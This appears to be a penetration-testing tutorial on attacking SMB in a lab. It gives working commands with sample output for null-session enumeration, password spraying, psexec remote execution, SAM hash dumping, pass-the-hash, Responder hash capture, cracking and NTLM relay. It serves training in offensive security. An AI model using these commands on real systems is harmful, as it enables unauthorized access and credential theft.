# Attacking SMB

Here’s the English explanation of the provided text about attacking the **Server Message Block (SMB)** protocol, broken down step-by-step in a detailed yet simple way:

***

#### What is SMB?

* **SMB** (Server Message Block) is a protocol that lets devices on a network share files and printers.
* Originally, it worked over **NetBIOS** using TCP port 139 and UDP ports 137/138. Now, modern Windows systems run it directly over TCP on port **445** without NetBIOS.
* If NetBIOS is enabled or you’re targeting a non-Windows system, you’ll see SMB on port 139.
* **Samba** is an open-source version of SMB for Linux/Unix, letting them work with Windows systems.

In short, SMB is like a bridge for sharing stuff between devices, running on port 445 or 139 depending on the setup.

***

#### How to Attack SMB?

To attack an SMB server, you need to know how it’s set up, what operating system it’s on (Windows or Linux), and which tools to use. Like other services, you can exploit:

1. **Misconfigurations**: Like if it’s open without a password.
2. **Known Vulnerabilities**: If there’s a flaw in its version.
3. **New Vulnerabilities**: If you discover something new.

Once you get in, check the shared folders (shares) for useful files. If targeting NetBIOS or RPC (Remote Procedure Call), figure out what info you can grab or what actions you can take.

***

#### Step 1: Enumeration (Gathering Info)

We use a tool like **Nmap** to see what’s running on the server. SMB uses ports 139 and 445, so we scan those:

```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

**Example Output:**

* Ports 139 and 445 are open.
* Version: Samba 4.6.2 (means it’s Linux, not Windows).
* Hostname: HTB.
* OS: Linux (since it’s using Samba).

Now we know the server runs Samba (Linux SMB), and we can plan our attack.

***

#### Exploiting Misconfigurations

Sometimes SMB is set up to allow access without a username or password, called a **Null Session**.

#### 1. Anonymous Authentication (Login Without Credentials)

If the server allows this, you can grab info like:

* List of shared folders (shares).
* Usernames.
* Permissions.

#### Tools to Use:

*   **smbclient**: Lists shared folders There’s a "notes" folder we can explore.

    ```bash
    smbclient -N -L //10.129.14.128
    ```

    * N: No password (Null Session).
    *   L: List shares. **Example Output:**

        ```bash
        Sharename    Type    Comment
        ADMIN$       Disk    Remote Admin
        C$           Disk    Default share
        notes        Disk    CheckIT
        IPC$         IPC     IPC Service
        ```
*   **smbmap**: Shows permissions for each share: **Example Output:** "notes" has read/write access, so we can download or upload files.

    ```bash
    smbmap -H 10.129.14.128
    ```

    ```bash
    Disk         Permissions    Comment
    ADMIN$       NO ACCESS      Remote Admin
    C$           NO ACCESS      Default share
    IPC$         READ ONLY      IPC Service
    notes        READ, WRITE    CheckIT
    ```

#### Downloading and Uploading Files:

*   Download a file:

    ```bash
    smbmap -H 10.129.14.128 --download "notes\\note.txt"
    ```

    * Downloads note.txt from the "notes" folder.
*   Upload a file:

    ```bash
    smbmap -H 10.129.14.128 --upload test.txt "notes\\test.txt"
    ```

    * Uploads test.txt to the "notes" folder.

#### 2. Remote Procedure Call (RPC)

To get more info like usernames, use **rpcclient**:

```bash
rpcclient -U'%' 10.10.110.17
```

*   U'%': Null Session (no credentials). **Inside the Tool:**

    ```bash
    rpcclient $> enumdomusers
    user:[mhope] rid:[0x641]
    user:[svc-ata] rid:[0xa2b]
    ```

This lists users on the server.

*   **enum4linux**: Automates gathering all this info: It pulls users, shares, OS details, etc.

    ```bash
    ./enum4linux-ng.py 10.10.11.45 -A -C
    ```

***

#### Protocol-Specific Attacks

If Null Session isn’t available, you’ll need credentials. Two common methods:

1. **Brute Force**: Try tons of passwords on one user, but it might lock the account.
2. **Password Spraying**: Try one password on many users to avoid lockouts.

#### Using CrackMapExec (CME):

```bash
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

* u: File with users (e.g., Administrator, admin, jrodriguez).
*   p: One password (e.g., Company01!). **Example Output:**

    ```bash
    SMB  10.10.110.17 445  WIN7BOX  [-] WIN7BOX\\Administrator:Company01! STATUS_LOGON_FAILURE 
    SMB  10.10.110.17 445  WIN7BOX  [+] WIN7BOX\\jurena:Company01! (Pwn3d!)
    ```

Found that jurena uses Company01!.

***

#### Attacks on Windows

If it’s a Windows server and you have admin rights, you can do more:

#### 1. Remote Code Execution (RCE)

*   **With impacket-psexec**: Gives you a command shell:

    ```bash
    impacket-psexec administrator:'Password123!'@10.10.110.17
    ```

    ```bash
    C:\\Windows\\system32> whoami
    nt authority\\system
    ```
*   **With CrackMapExec**: Runs the command and returns nt authority\system.

    ```bash
    crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami'
    ```

#### 2. List Logged-On Users

```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

Shows who’s logged in across the network.

#### 3. Extract Hashes from SAM

*   The **SAM** (Security Account Manager) is a database with user password hashes. **Output:**

    ```bash
    crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
    ```

    ```bash
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
    jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
    ```

#### 4. Pass-the-Hash (PtH)

If you have a hash (e.g., 2b576acbe6bcfda7294d6bd18041b8fe), use it without cracking:

```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe
```

Logs you in as admin using the hash.

***

#### Forced Authentication Attacks (Stealing Hashes)

You can set up a fake SMB server with **Responder** to steal user hashes:

```bash
sudo responder -I ens33
```

*   If someone mistypes a share (e.g., \\\mysharefoder instead of \\\mysharedfolder), Responder tricks them and grabs their hash:

    ```bash
    [SMB] NTLMv2-SSP Username : WIN7BOX\\demouser
    [SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:..
    ```

#### Cracking the Hash:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

If successful, it might reveal a password like P@ssword.

#### Relaying the Hash:

If you can’t crack it, relay it to another machine with **impacket-ntlmrelayx**:

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

This can dump the SAM or run commands if you add -c.

***

#### Summary

You can attack SMB in several ways:

* If it’s open without a password, check shares and grab/upload files.
* If locked, use Password Spraying or hashes.
* On Windows, run commands or extract hashes.
* To steal hashes, use Responder.
